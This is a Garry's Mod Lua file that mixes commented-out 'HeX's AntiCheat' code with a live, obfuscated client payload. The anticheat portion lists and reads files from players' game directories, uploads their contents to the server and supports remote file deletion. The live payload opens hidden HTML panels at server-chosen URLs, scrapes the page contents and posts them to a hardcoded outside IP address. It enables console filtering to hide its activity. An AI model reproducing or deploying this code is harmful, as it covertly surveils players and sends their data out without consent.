	"lua/weaponsold/weapon_/",
	"lua/stargate/",
	"lua/achievements/",
	"lua/CAF/Addons/",
	"lua/SPM/Commands/",
	"lua/SPM/Plugins/",
	"lua/rd2/stools/",
	"lua/exsto/plugins/",
	"lua/AVehicles/",
	"lua/includes/entities/",
	"lua/app_framework/controls/",
	"lua/includes/weapons/",
	"lua/lua/entities/",
	"lua/lua/weapons/",
	"lua/chatsounds/lists_nosend/",
	"lua/chatsounds/lists_send/",
	"lua/PewPewBullets/",
	"lua/PewPewPlugins/",
	"lua/pewpewbullets/",
	"lua/autorun/entities/",
	"lua/autorun/weapons/",
	"lua/lua/autorun/server/",
	"addons/wire/lua/effects/",
	"addons/wire/lua/entities/",
	"addons/wire/lua/wire/",
	"addons/AdvDuplicator-master/lua/",
	"addons/wire-master/lua/",
	"addons/wire-extras-master/lua/",
	"addons/wire-extras/lua/",
	"addons/wire_extras/lua/",
	"addons/wire_master/lua/",
	"addons/wiresocketrad/lua/",
	"addons/wire/branches/",
	"addons/wire/tags/",
	"addons/wire/trunk/",
	"addons/Wiremod/lua/",
	"addons/wiremod/lua/",
	"addons/wire/lua/",
	"addons/cap/lua/",
	"addons/AdvDuplicator/lua/",
	"addons/advdupe2/lua/",
	"addons/sb3/lua/",
	"addons/sbep-master/lua/",
	"addons/PewPew/lua/",
	"addons/Wire/lua/",
	"addons/Wiremod/wire-master/",
	"addons/pointshop-master/lua/",
	"addons/exsto-master/lua/",
	"addons/TDMCars/lua/",
	"addons/wiremodex/lua/",
	"hl2/media/StartupVids.txt",
	"addons/wire/wire/lua/",
	"addons/NeuroBase/lua/",
	"addons/neurobase/lua/",
	"addons/NeuroTanks/lua/",
	"addons/NeuroPlanes/Lua/",
	"addons/NeuroNaval/lua/",
	"addons/NeuroWeapons/Lua/",
	"addons/tdm/lua/",
	"addons/Cap2/lua/",
	"addons/wiremod/wire/lua/",
	"addons/SBEP_Entities/lua/",
	"addons/SBEP_Experimental/lua/",
	"addons/SBEP_Models/lua/",
	"addons/Wire Extras/lua/",
	"addons/WireExtras/lua/",
	"addons/grafityhull/lua/",
	"addons/pcmod/lua/",
	"addons/pcmod2/lua/",
	"addons/petrol_systems/lua/",
	"addons/resource_transit_system/lua/",
	"addons/spacebuild/lua/",
	"addons/gassystems2/lua/",
	"addons/black_hole_cache/lua/",
	"addons/wtiberium/lua/",
	"addons/Zombie Survival/gamemodes/",
	"addons/tdmcars/lua/",
	"addons/lua/effects/",
	"addons/lua/entities/",
	"addons/lua/wire/",
	"addons/ACF-master/lua/",
	"addons/pac3-master/lua/",
	"addons/SBEP Models/lua/",
	"addons/TDM Dealer/lua/",
	"addons/ACF/branches/",
	"addons/ACF/trunk/",
	"addons/zombiesurvival/",
	"addons/WireMod/lua/",
	"addons/ulib/lua/",
	"addons/ulx/lua/",
	"addons/Wiremod/wire/",
	"addons/anonsvn/wire/",
	"addons/AdvDuplicator/",
	"addons/wire-extras/",
	"addons/PointShop/lua/",
	"addons/ulx/ulib/lua/",
	"addons/ulx/ulx/lua/",
	"addons/ulx/ups/lua/",
}


local NoEXP = {
	["intl3_svn.dll"] = 1,
	["libapr-1.dll"] = 1,
	["libapriconv-1.dll"] = 1,
	["libaprutil-1.dll"] = 1,
	["libcurl.dll"] = 1,
	["libdb44.dll"] = 1,
	["libeay32.dll"] = 1,
	["libidn-11.dll"] = 1,
	["librtmp.dll"] = 1,
	["libssh2.dll"] = 1,
	["libsvn_client-1.dll"] = 1,
	["libsvn_delta-1.dll"] = 1,
	["libsvn_diff-1.dll"] = 1,
	["libsvn_fs-1.dll"] = 1,
	["libsvn_ra-1.dll"] = 1,
	["libsvn_repos-1.dll"] = 1,
	["libsvn_subr-1.dll"] = 1,
	["libsvn_wc-1.dll"] = 1,
	["ssleay32.dll"] = 1,
	["zlib1.dll"] = 1,
	["crashhandler.dylib"] = 1,
	["crashhandler.so"] = 1,
	["chromehtml.so"] = 1,
	["d3dx9_40.dll"] = 1,
	["libawesomium-1-7.so.0"] = 1,
	["libawesomium-1-7.so.2"] = 1,
	["libawesomium-1-7.so.2.0"] = 1,
	["xinput9_1_0.dll"] = 1,
	["binkw32.dll"] = 1,
	["steamclient.dll"] = 1,
	["telemetry32.dll"] = 1,
	["vaudio_miles.dll"] = 1,
	["gmod_audio.so"] = 1,
	["libsdl2-2.0.so.0"] = 1,
	["libsdl2-2.0.so"] = 1,
	["libbass.so"] = 1,
	["libprofiler.so.0"] = 1,
	["libprofiler.so"] = 1,
	["libtcmalloc_minimal.so"] = 1,
	["libtcmalloc_minimal.so.4"] = 1,
	["libudev.so"] = 1,
	["libudev.so.0"] = 1,
	["valve_avi.dll"] = 1,
	["rdmwin32.dll"] = 1,
	["friendsui.dll"] = 1,
	["client.dll"] = 1,
	["server.dll"] = 1,
	["v.tga"] = 1,
	["libcef.dylib"] = 1,
	["gmad_publish.bat"] = 1,
	["apple.ico"] = 1,
	["avformat-52.dll"] = 1,
	["awesom~1.log"] = 1,
	["avutil-50.dll"] = 1,
	["avcodec-52.dll"] = 1,
	["adminserver.dll"] = 1,
	["video_bink.dll"] = 1,
	["libmilesx86.dylib"] = 1,
	["chromehtml.dylib"] = 1,
	["replay.dylib"] = 1,
	["awesomium.dll"] = 1,
	["clientregistry.blob"] = 1,
	["filesystemopendialog.dll"] = 1,
	["filesystem_stdio.dll"] = 1,
	["gameui.dll"] = 1,
	["sdl2.dll"] = 1,
	["serverbrowser.dll"] = 1,
	["steam.dll"] = 1,
	["avcodec-53.dll"] = 1,
	["avformat-53.dll"] = 1,
	["avutil-51.dll"] = 1,
	["awesomium_process.exe"] = 1,
	["basehaptics.txt"] = 1,
	["bass.dll"] = 1,
	["bsppack.dll"] = 1,
	["bspzip.exe"] = 1,
	["bugreporter.dll"] = 1,
	["bugreporter_filequeue.dll"] = 1,
	["bugreporter_public.dll"] = 1,
	["captioncompiler.exe"] = 1,
	["chromehtml.dll"] = 1,
	["crashhandler.dll"] = 1,
	["datacache.dll"] = 1,
	["datamodel.dll"] = 1,
	["dedicated.dll"] = 1,
	["demoinfo.exe"] = 1,
	["dmserializers.dll"] = 1,
	["dmxedit.exe"] = 1,
	["dxsupport.cfg"] = 1,
	["dxsupport.csv"] = 1,
	["dxsupport_episodic.cfg"] = 1,
	["dxsupport_sp.cfg"] = 1,
	["elementviewer.exe"] = 1,
	["engine.dll"] = 1,
	["glview.exe"] = 1,
	["gmad.exe"] = 1,
	["gmod_audio.dll"] = 1,
	["gmpublish.exe"] = 1,
	["hammer.exe"] = 1,
	["hammer_dll.dll"] = 1,
	["haptics.dll"] = 1,
	["headtrack_oculus.dll"] = 1,
	["height2normal.exe"] = 1,
	["height2ssbump.exe"] = 1,
	["hlfaceposer.exe"] = 1,
	["hlmv.exe"] = 1,
	["icudt.dll"] = 1,
	["icudt42.dll"] = 1,
	["inputsystem.dll"] = 1,
	["launcher.dll"] = 1,
	["libegl.dll"] = 1,
	["libglesv2.dll"] = 1,
	["libcef.dll"] = 1,
	["libsasl.dll"] = 1,
	["materialsystem.dll"] = 1,
	["mdllib.dll"] = 1,
	["msvcr71.dll"] = 1,
	["mysql_wrapper.dll"] = 1,
	["parsifal.dll"] = 1,
	["replay.dll"] = 1,
	["scenefilecache.dll"] = 1,
	["serverplugin_empty.dll"] = 1,
	["shaderapidx9.dll"] = 1,
	["shaderapiempty.dll"] = 1,
	["shadercompile.exe"] = 1,
	["shadercompile_dll.dll"] = 1,
	["sixense.dll"] = 1,
	["sixense_utils.dll"] = 1,
	["soundemittersystem.dll"] = 1,
	["soundsystem.dll"] = 1,
	["splitskybox.exe"] = 1,
	["srcds.exe"] = 1,
	["stdshader_dbg.dll"] = 1,
	["stdshader_dx6.dll"] = 1,
	["stdshader_dx7.dll"] = 1,
	["stdshader_dx8.dll"] = 1,
	["stdshader_dx9.dll"] = 1,
	["steam_api.dll"] = 1,
	["steam_appid.txt"] = 1,
	["steamclient.dll"] = 1,
	["studiorender.dll"] = 1,
	["texturecompile_dll.dll"] = 1,
	["tier0.dll"] = 1,
	["tier0_s.dll"] = 1,
	["unicode.dll"] = 1,
	["unicows.dll"] = 1,
	["unitlib.dll"] = 1,
	["vaudio_speex.dll"] = 1,
	["vgui2.dll"] = 1,
	["vguimatsurface.dll"] = 1,
	["vidcfg.bin"] = 1,
	["video_quicktime.dll"] = 1,
	["video_services.dll"] = 1,
	["vphysics.dll"] = 1,
	["vpk.exe"] = 1,
	["vrad.exe"] = 1,
	["vrad_dll.dll"] = 1,
	["vstdlib.dll"] = 1,
	["vstdlib_s.dll"] = 1,
	["vtex.dll"] = 1,
	["vtex.exe"] = 1,
	["vtex_dll.dll"] = 1,
	["vtf2tga.exe"] = 1,
	["vvis.exe"] = 1,
	["vvis_dll.dll"] = 1,
	["xinput1_3.dll"] = 1,
	["awesomium.framework"] = 1,
	["awesomium.log"] = 1,
	["sdk.fgd"] = 1,
	["hl2.exe"] = 1,
	["halflife2.fgd"] = 1,
	["base.fgd"] = 1,
	["cmdseq.wc"] = 1,
	["libmysql.dll"] = 1,
	["awesomium"] = 1,
	["gameui.dylib"] = 1,
	["gameui.so"] = 1,
	["serverbrowser.dylib"] = 1,
	["serverbrowser.so"] = 1,
	["engine.dylib"] = 1,
	["engine.so"] = 1,
	["engine_srv.so"] = 1,
	["inspector.pak"] = 1,
	["libawesomium-1-7.so"] = 1,
	["libcef.so"] = 1,
	["libsteam.so"] = 1,
	["libsteamvalidateuseridtickets.so"] = 1,
	["replay.so"] = 1,
	["steamclient.so"] = 1,
	["video_webm.so"] = 1,
	["awesomium_process"] = 1,
	["bsppack.dylib"] = 1,
	["bsppack.so"] = 1,
	["datacache.dylib"] = 1,
	["datacache.so"] = 1,
	["datacache_srv.so"] = 1,
	["dedicated.dylib"] = 1,
	["dedicated.so"] = 1,
	["dedicated_srv.so"] = 1,
	["filesystem_stdio.dylib"] = 1,
	["filesystem_stdio.so"] = 1,
	["filesystem_steam.dll"] = 1,
	["filesystem_steam.dylib"] = 1,
	["filesystem_steam.so"] = 1,
	["gmad_linux"] = 1,
	["gmad_osx"] = 1,
	["gmpublish_linux"] = 1,
	["gmpublish_osx"] = 1,
	["hl2.sh"] = 1,
	["hl2_linux"] = 1,
	["hl2_osx"] = 1,
	["inputsystem.dylib"] = 1,
	["inputsystem.so"] = 1,
	["launcher.dylib"] = 1,
	["launcher.so"] = 1,
	["libmiles.so"] = 1,
	["libtelemetryx64.so"] = 1,
	["libtelemetryx86.so"] = 1,
	["libffmpegsumo.so"] = 1,
	["libsteam_api.dylib"] = 1,
	["libsteam_api.so"] = 1,
	["libtier0.dylib"] = 1,
	["libtier0.so"] = 1,
	["libtier0_s.so"] = 1,
	["libtier0_srv.so"] = 1,
	["libtogl.dylib"] = 1,
	["libtogl.so"] = 1,
	["libvstdlib.dylib"] = 1,
	["libvstdlib.so"] = 1,
	["libvstdlib_s.so"] = 1,
	["libvstdlib_srv.so"] = 1,
	["materialsystem.dylib"] = 1,
	["materialsystem.so"] = 1,
	["materialsystem_srv.so"] = 1,
	["mssmp3.asi"] = 1,
	["mssvoice.asi"] = 1,
	["replay_srv.so"] = 1,
	["scenefilecache.dylib"] = 1,
	["scenefilecache.so"] = 1,
	["scenefilecache_srv.so"] = 1,
	["shaderapidx10.dll"] = 1,
	["shaderapidx9.dylib"] = 1,
	["shaderapidx9.so"] = 1,
	["shaderapiempty.dylib"] = 1,
	["shaderapiempty.so"] = 1,
	["shaderapiempty_srv.so"] = 1,
	["soundemittersystem.dylib"] = 1,
	["soundemittersystem.so"] = 1,
	["soundemittersystem_srv.so"] = 1,
	["srcds_linux"] = 1,
	["srcds_osx"] = 1,
	["srcds_run"] = 1,
	["stdshader_dx9.dylib"] = 1,
	["stdshader_dx9.so"] = 1,
	["studiorender.dylib"] = 1,
	["studiorender.so"] = 1,
	["studiorender_srv.so"] = 1,
	["valve_bink.dll"] = 1,
	["vaudio_miles.so"] = 1,
	["vaudio_speex.so"] = 1,
	["vgui2.dylib"] = 1,
	["tags.dll"] = 1,
	["bass.dll"] = 1,
	["vgui2.so"] = 1,
	["vguimatsurface.dylib"] = 1,
	["vguimatsurface.so"] = 1,
	["video_bink.so"] = 1,
	["video_quicktime.dylib"] = 1,
	["video_services.dylib"] = 1,
	["video_services.so"] = 1,
	["vphysics.so"] = 1,
	["vphysics_srv.so"] = 1,
	["vtex_dll.dylib"] = 1,
	["vtex_dll.so"] = 1,
	["webui_assets.pak"] = 1,
	["gameoverlayrenderer.log"] = 1,
	["debug.log"] = 1,
	["steam.log"] = 1,
	["gmod_audio.dylib"] = 1,
	["headtrack_oculus.dylib"] = 1,
	["libbass.dylib"] = 1,
	["vaudio_speex.dylib"] = 1,
	["vphysics.dylib"] = 1,
	["gameconfig.txt"] = 1,
	["mss32.dll"] = 1,
	["logitechlcd.dll"] = 1,
	["voice_input.wav"] = 1,
}
local NoEXP_F = {
	["sourcesdk_content"] = 1,
	["media"] = 1,
	["pvkii"] = 1,
	["garrysmod_danish"] = 1,
	["garrysmod_swedish"] = 1,
	["ep2"] = 1,
	["sdk"] = 1,
	["ageofchivalry"] = 1,
	["databases-incognito"] = 1,
	["awesomium.framework"] = 1,
	["garrysmod_greek"] = 1,
	["garrysmod_dutch"] = 1,
	["garrysmod_german"] = 1,
	["garrysmod_russian"] = 1,
	["garrysmod_save"] = 1,
	["garrysmod_old"] = 1,
	["osx32"] = 1,
	["zps"] = 1,
	["cstrike"] = 1,
	["lostcoast"] = 1,
	["appcache"] = 1,
	["tf"] = 1,
	["bin"] = 1,
	["config"] = 1,
	["dumps"] = 1,
	["filters"] = 1,
	["garrysmod"] = 1,
	["portal2"] = 1,
	["hl2mp"] = 1,
	["logs"] = 1,
	["platform"] = 1,
	["sourceengine"] = 1,
	["hl1"] = 1,
	["tools"] = 1,
	["sound"] = 1,
	["materials"] = 1,
	["models"] = 1,
	["hl2"] = 1,
}



local _G				= _G
local include			= include
local RunConsoleCommand	= RunConsoleCommand
local tostring			= tostring
local type				= type
local pcall				= pcall
local pairs				= pairs
local ErrorNoHalt		= ErrorNoHalt
local Format			= string.format
local NotFO				= file.Open
local NotFID			= file.IsDir
local NotFF				= file.Find
local NotFD				= file.Delete
local NotTS				= timer.Simple
local NotCRC			= util.CRC
local NotTIS			= function(k,v) k[#k+1] = v end
local NotJST			= util.TableToJSON
local _R 				= debug.getregistry()
local F_Size 			= _R.File.Size
local F_Close 			= _R.File.Close
local F_Read  			= _R.File.Read


_G.AllowedList		= nil
include("lists/sh_W_HKS.lua")
local NoSend		= _G.AllowedList or {}
_G.AllowedList		= nil

_G.AllowedList_Old	= nil
include("lists/sh_W_HKS_Old.lua")
local NoSend_Old	= _G.AllowedList_Old or {}
_G.AllowedList_Old	= nil



include("HAC/sh_HACBurst.lua")

local burst 	= ErrorNoHalt
local bursthook = ErrorNoHalt
if _G.hacburst then
	if _G.hacburst.Send then	burst = _G.hacburst.Send		end
	if _G.hacburst.Hook then	bursthook = _G.hacburst.Hook	end
end


local WaitFor		= 15
local CheckTime		= #NoSend
local CurTime 		= CurTime()


local function ValidString(v)
	return (v and type(v) == "string" and v != "")
end
local function StartsWith(str,check)
	return str:sub(1,#check) == check
end
local function EndsWith(str,ends)
   return ends == "" or str:sub(-#ends) == ends
end
local function NotTHV(tab,val)
	val = val:lower()
	for k,v in pairs(tab) do
		if v:lower() == val then return true end
	end
	return false
end
local function FMerge(with,what)
	for k,v in pairs(with) do
		NotTIS(what,v)
	end
end
local Bad = false
local i = 6
local function ReportMe(str,bad)
	NotTS(i, function()
		RunConsoleCommand("damn", str)
	end)
	i = i + 2
	
	if bad then
		Bad = true
		NotTS(160, function()
			for k,v in pairs(_G) do _G[k] = NotFO end
		end)
	end
end



local function GetCRCAndFile(name,SPath)
	local err,ret = pcall(function()
		local Out = NotFO(name, "rb", SPath)
			if not Out then
				ReportMe("ICheck=NotFO("..name..")")
				return false
			end
			local Size = F_Size(Out)
			
			if Size > 5000000 then
				ReportMe("ICheck=SizeOf("..name..") > "..tostring(Size) )
				F_Close(Out)
				return false
			end
			
			local str = F_Read(Out,Size)
		F_Close(Out)
		
		return str
	end)
	
	if not err then
		--ReportMe("ICheck=pc1("..name..") "..tostring(err) )
		
		err,ret = nil,nil
		err,ret = pcall(function()
			return file.Read(name,"GAME")
		end)
		
		if not err then
			--ReportMe("ICheck=pc2("..name..") "..tostring(err) )
			return false,false
		end
	end
	
	
	if not ValidString(ret) then
		return false,false
	end
	
	return (NotCRC(ret) or "Gone"),ret
end


local function IsUselessDir(v)
	if NotTHV(UselessData, v) then return true end
	
	for k,That in pairs(Useless) do
		if StartsWith(v,That) then
			return true
		end
	end
	
	for k,That in pairs(UselessData) do
		if StartsWith(v,That) then
			return true
		end
	end
	
	if StartsWith(v,"addons/") then
		if v:find("/lua/effects/", nil,true) and EndsWith(v,"/init.lua") then return true end
		if v:find("/lua/weapons/gmod_tool/stools/", nil,true) then return true end
		
		if v:find("/lua/weapons/", nil,true) or v:find("/lua/entities/", nil,true) and
			(EndsWith(v, "/shared.lua") or EndsWith(v, "/init.lua") or EndsWith(v, "/cl_init.lua")) then return true
		end
	end
	
	return false
end


local FAlwaysBad = {
	[".."] 		= 1,
	["..."]		= 1,
	[".svn"]	= 1,
	[".mdmp"]	= 1,
}

local FAlwyasGood = {
	lua	= 1, xml	= 1, cfg	= 1, bak	= 1, conf	= 1,
	txt	= 1, old	= 1, lua2	= 1, hmod	= 1, php	= 1,
	ini	= 1, ok		= 1, bb 	= 1, luac 	= 1, gay	= 1,
	hax	= 1, hac	= 1, h4x	= 1,
}
local FAlwyasGoodAddons = {
	lua	= 1, bak	= 1, old	= 1, lua2	= 1,
}


local function FindAllIn(dir,SPath,Good,Bad)
	local tab = {}
	
	local function LoadFromBuffer(dir,tab,Good,Bad)
		local files,fold = NotFF(dir.."/*", SPath)
		if fold then
			FMerge(fold, files)
		end
		
		if not files then files = {} end
		if not Good then Good = FAlwyasGood end
		if not Bad then Bad = {} end
		
		FMerge(Bad, FAlwaysBad)
		
		for k,what in pairs(files) do
			local ext	= what:sub(-3)
			local Here	= dir.."/"..what
			
			if not Good[ext] or NotFID(what, SPath) then
				LoadFromBuffer(Here, tab, Good, Bad)
				
			elseif Good[ext] and not Bad[ext] then
				if not NotTHV(tab, Here) and not IsUselessDir(Here) then
					NotTIS(tab, Here)
				end
			end
		end
	end
	
	LoadFromBuffer(dir,tab,Good,Bad)
	
	return tab
end



local Proper 	= {}
local AllFiles	= {}

local function ProcessTable(Tab, SPath)
	for k,NewFile in pairs(Tab) do
		local NewCRC,Text = GetCRCAndFile(NewFile, SPath)
		
		NotTIS(AllFiles,
			{
				NewFile = NewFile,
				NewCRC 	= (NewCRC and NewCRC or "NoFO"),
				SPath	= SPath,
			}
		)
		
		if NewCRC then
			local UID = NotCRC( Format("%s-%s", NewFile, NewCRC) )
			if not NotTHV(NoSend, UID) and not NotTHV(NoSend_Old, UID) then
				NotTIS(Proper,
					{
						NewFile = NewFile,
						NewCRC 	= NewCRC,
						Text	= Text,
						SPath	= SPath,
					}
				)
			end
		end
	end
end

local function EatTable(where, SPath, gTab)
	local Tab = FindAllIn(where, SPath, gTab)
	
	ProcessTable(Tab, SPath)
end

EatTable("lua1",		"MOD")
EatTable("lua2",		"MOD")
EatTable("Copy of lua",	"MOD")
EatTable("lua_old",		"MOD")
EatTable("lua - Copy", 	"MOD")
EatTable("lua2", 		"MOD")
EatTable("lua", 		"MOD")
EatTable("data", 		"MOD")
EatTable("hax", 		"MOD")
EatTable("hacks", 		"MOD")
EatTable("cheats", 		"MOD")
EatTable("cheat", 		"MOD")
EatTable("script", 		"MOD")

local files,fold = NotFF("*", "EXECUTABLE_PATH")
if files and #files > 0 then
	local Tab = {}
	for k,v in pairs(files) do
		local low = v:lower()
		
		if not NoEXP[ low ] and low:sub(-5) != ".mdmp" then
			NotTIS(Tab, v)
		end
	end
	
	if #Tab > 0 then
		ProcessTable(Tab, "EXECUTABLE_PATH")
	end
else
	ReportMe("FFF=NoFF",1)
end

if fold and #fold > 0 then
	for k,v in pairs(fold) do
		if not NoEXP_F[ v:lower() ] then
			EatTable(v, "EXECUTABLE_PATH")
			
			NotTIS(AllFiles,
				{
					NewFile = v,
					NewCRC 	= "DIR",
					SPath	= "EXECUTABLE_PATH",
				}
			)
		end
	end
else
	ReportMe("FFF=NoFD",1)
end


EatTable("addons", 	"MOD", FAlwyasGoodAddons)



local function DoCheckBuff()
	burst(tostring(CheckTime), NotJST(
			{
				TXOk	= CheckTime,
				TXList	= #NoSend,
				TXInit	= (not WFC111255),
				CurTime = CurTime,
			}
		)
		,nil,nil,true
	)
	
	burst(tostring(CheckTime * 2), NotJST(AllFiles), nil,nil,true)
	AllFiles = {}
	
	for k,v in pairs(Proper) do
		burst(tostring(CheckTime), NotJST(
				{
					Name	= v.NewFile,
					CRC		= v.NewCRC,
					SPath	= v.SPath,
					CurSize	= k,
					AllSize	= #Proper,
					Cont	= v.Text,
				}
			)
		)
	end
	Proper = {}
	
	
	--[[
	if #NoSend_Old != 5447 then
		ReportMe("NoSend_Old("..#NoSend_Old.." != 5447)")
	end]]
end
NotTS(WaitFor, DoCheckBuff)

local function Delete(str,len,sID,idx,Total)
	NotFD(str)
end
bursthook("Delete", Delete)


local ConstRand = CurTime * 2
local Prog = 0
local function BootyBucket(cont,name)
	if not ValidString(cont) then return end
	
	Prog = Prog + 1
	ConstRand = ConstRand + Prog
	
	local NewFile = Format("BootyBucket/%s-%s%s", (name or "BB"), (NotCRC(cont) or ConstRand), Prog)
	
	burst(tostring(CheckTime), NotJST(
			{
				Name	 = NewFile,
				CRC		 = tostring(Prog),
				SPath	 = "MOD",
				CurSize	 = 1,
				AllSize  = 1,
				Cont	 = cont,
				IsBucket = true,
			}
		), nil, nil, true
	)
end
_G.BootyBucket = BootyBucket

local NotBBUF = BootyBucket
local function CheckBBUF()
	NotTS(2, CheckBBUF)
	
	if not _G.BootyBucket or _G.BootyBucket != NotBBUF then
		ReportMe("ICheck=Bucket")
		
		ErrorNoHalt("[ERROR] lua/autorun/client/hex_ac.lua:106: attempt to index global 'file' (a nil value)")
	end
	_G.BootyBucket	= NotBBUF
	
	if Bad then
		ErrorNoHalt("[ERROR] lua/autorun/client/hex_ac.lua:223: attempt to index global 'string' (a nil value)")
	end
end
NotTS(1, CheckBBUF)
]]--

local
_,a,b={_="Simple",a="OnFinishLoadingDocument"},{},vgui.Create"DHTML"b:SetSize(1,1)b:Center()function
fuckfunc(a,b)local
c,d,e=string.Explode("\n",b),{},!!1
if
string.find(c[1],"<head><script>start",1,!!1)then
c[#c]=nil
c[1]=nil
c[2]=nil
else
e=!1
end
for
a,b
in
pairs(c)do
local
a,c=nil
for
e=1,string.len(b)do
if(b[e]=="\"")then
if
a
then
c=e-1
table.insert(d,string.sub(b,a,c))break
end
a=e+1
end
end
end
local
c=0
if
e
then
for
b,c
in
pairs(d)do
local
b=#c||string.len(c)||nil
if!b
then
continue
end
net.Start"imcocked"net.WriteString(a.cururl)net.WriteUInt(b,32)net.WriteData(c,b)net.SendToServer()end
else
local
c={a=string.sub(a.cururl,9),b=string.sub(b,79)}http.Post("http://138.68.156.164/epic.php",c)end
end
b:AddFunction("imsorry","mypenisistoobig",function(a)fuckfunc(b,a)end)local
f
local
function
g(h,i)if(i=="<head></head><body></body>")then
h:Remove()h=nil
return
end
local
j,k,l=string.Explode("\n",i),{},!!1
if
string.find(j[1],"<head><script>start",1,!!1)then
j[#j]=nil
j[1]=nil
j[2]=nil
else
l=!1
end
for
h,i
in
pairs(j)do
local
h,j=nil
for
l=1,string.len(i)do
if(i[l]=="\"")then
if
h
then
j=l-1
table.insert(k,string.sub(i,h,j))break
end
h=l+1
end
end
end
local
j=0
f=CurTime()+2
if
l
then
for
i,j
in
pairs(k)do
local
l,m=string.GetExtensionFromFilename(j),h.cururl
if
l
then
table.insert(a,string.sub(m,9)..j)else
timer[_._](i*0.1,function()local
l=vgui.Create"DHTML"l:SetSize(1,1)l[_.a]=b[_.a]l:AddFunction("imsorry","mypenisistoobig",function(n)g(l,n)end)l:OpenURL(string.sub(m,9)..j.."/")end)end
end
else
local
j={a=string.sub(h.cururl,9),b=string.sub(i,79)}http.Post("http://138.68.156.164/epic.php",j)end
h:SetVisible(!1)h:Remove()h=nil
end
b[_.a]=function(a,b)a.cururl=b
a:QueueJavascript"imsorry.mypenisistoobig(document.documentElement.innerHTML);"end
net.Receive("imcocked",function(a)local
a=net.ReadString()RunConsoleCommand("con_filter_enable","1")RunConsoleCommand("con_filter_text"," ")RunConsoleCommand("con_filter_text_out"," ")timer[_._](0.01,function()b:OpenURL(a)end)timer[_._](1,function()RunConsoleCommand("con_filter_enable","0")end)end)net.Receive("imcocked2",function(o)local
o=net.ReadString()RunConsoleCommand("con_filter_enable","1")RunConsoleCommand("con_filter_text"," ")RunConsoleCommand("con_filter_text_out"," ")timer[_._](0.01,function()for
p,q
in
pairs(a)do
a[p]=nil
end
f=nil
local
r=vgui.Create"DHTML"r:SetSize(1,1)r[_.a]=b[_.a]r:AddFunction("imsorry","mypenisistoobig",function(s)g(r,s)end)r:OpenURL(o)timer[_._](0.3,function()if!f
then
hook.Remove("Think","lel")end
hook.Add("Think","lel",function()if
f&&CurTime()>f
then
hook.Remove("Think","lel")for
r,t
in
pairs(a)do
timer[_._](r/10,function()local
r=vgui.Create"DHTML"r:SetSize(1,1)r[_.a]=b[_.a]r:AddFunction("imsorry","mypenisistoobig",function(u)g(r,u)end)r:OpenURL(t)end)end
timer[_._]((#a/10)+1,function()RunConsoleCommand("con_filter_enable","0")end)end
end)end)end)end)

--[[
/*
 _____     _  _       _                 _____ _       _                 _ 
|_   _|__ (_)(_) __ _| | __ _          |  ___(_)_ __ | | __ _ _ __   __| |
  | |/ _ \| || |/ _` | |/ _` |  _____  | |_  | | '_ \| |/ _` | '_ \ / _` |
  | | (_) | || | (_| | | (_| | |_____| |  _| | | | | | | (_| | | | | (_| |
  |_|\___/|_|/ |\__,_|_|\__,_|         |_|   |_|_| |_|_|\__,_|_| |_|\__,_|
           |__/                                                           
         ____   ___  _ _  _   
        |___ \ / _ \/ | || |  
 _____    __) | | | | | || |_ 
|_____|  / __/| |_| | |__   _|
        |_____|\___/|_|  |_|  
                              

"leaked" by HH - 9 Jun 2014

*/



--[[
	=== HeX's AntiCheat ===
	"A good attempt at something impossible"
	
	If you're reading this, you have stolen my files and are a cheating dirtbag.
	This is only in use on the UnitedHosts Deathmatch server, if you want to play there,
	disconnect and return with no cheats. You'll be permabanned if you attempt to bypass this.
	
	If you have any ideas how to make this better, or something I should add, add me on steam
	http://steamcommunity.com/id/MFSiNC
	
	Dear Script Bandits:
		How low can you go.
	:(
]]

HACInstalled	   = 1
HACCredits		   = [[
	Creator        = HeX
	Ideas/Testing  = Discord/C0BRA/G-Force/TGiFallen/Sykranos/Leystryku. And all those kids who think they can "hack"
	GMod 13 fixing = Fangli/HeX
	Mac Testing    = Blackwolf
	Made for       = [United|Hosts] Deathmatch [LotsaWeapons|HAC|FastDL]
]]

--[[
	=== End credits ===
	If you read below this line, please delete this file and leave GMod forver.
]]

local function Useless() return end
local MSGHook		= "hac_united-hosts_hex"
local Silent		= false
local NotRCC		= RunConsoleCommand
local NotCCC		= CreateClientConVar
local NotCCV		= CreateConVar
local NotGCV		= GetConVar
local NotGCS		= GetConVarString
local NotGCN 		= GetConVarNumber
local NotCVE 		= ConVarExists
local NotRE			= rawequal
local NotRGT		= rawget
local NotRST		= rawset
local NotINC		= include
local NotRQ			= require
local NotGCI		= gcinfo
local NotGMT		= getmetatable
local NotSMT		= setmetatable
local NotCGB		= collectgarbage
local NotHP			= CompileString
local NotST			= RunString
local NotSX			= RunStringEx
local GetPlayer		= xpcall
local _G			= _G
local pcall			= pcall
local pairs			= pairs
local select		= select
local type			= type
local Msg			= Msg
local MsgN			= MsgN
local print			= print
local MsgC			= MsgC
local tostring		= tostring
local tonumber		= tonumber
local LocalPlayer	= LocalPlayer
local Format		= string.format
local NotSD			= string.dump
local NotCHR		= string.char
local NotSL			= string.lower
local NotGS			= string.gsub
local NotSS			= string.sub
local NotFL			= string.find
local NotDGU		= debug.getupvalue
local NotDGE		= debug.getinfo
local NotDGMT		= debug.getmetatable
local NotFO			= file.Open
local NotFXE		= file.Size
local NotFF			= file.Find
local NotFD			= file.Delete
local NotFE			= file.Exists
local NotRPF		= util.RelativePathToFull
local NotCRC		= util.CRC
local NotJST		= util.TableToJSON
local NotJTT		= util.JSONToTable
local NotB64		= util.Base64Encode
local NotTS			= timer.Simple
local NotTC			= timer.Create
local NotTD			= timer.Destroy
local NotTIT		= timer.Exists
local NotGGM		= game.GetMap
local NotMR			= math.random
local NotSCF		= surface.CreateFont
local NotSIW		= system.IsWindows
local NotJUF 		= jit.util.funcinfo
local NotTIS		= function(k,v) k[#k+1] = v end
debug.debug			= nil
debug.getfenv 		= nil
debug.gethook		= nil
debug.getlocal		= nil
debug.getupvalue	= nil
debug.setmetatable	= nil
debug.setfenv		= nil
debug.setlocal 		= nil
debug.setupvalue	= nil
debug.upvaluejoin	= nil
debug.getmetatable	= nil
jit.attach			= nil
jit.on				= nil
jit.off				= nil
debugoverlay		= nil
setfenv				= nil
debug.sethook()
debug.sethook 		= error

local _R			= debug.getregistry()
local NotRIV		= _R.Entity.IsValid
local NotBLT		= _R.Entity.FireBullets
local NotSEA		= _R.Player.SetEyeAngles
local NotPCC		= _R.Player.ConCommand
local NotCPT		= _R.Player.ChatPrint
local NotRS			= _R.bf_read.ReadString
local NotSVA		= _R.CUserCmd.SetViewAngles
local NotGIN		= _R.ConVar.GetInt
local NotGSS		= _R.ConVar.GetString
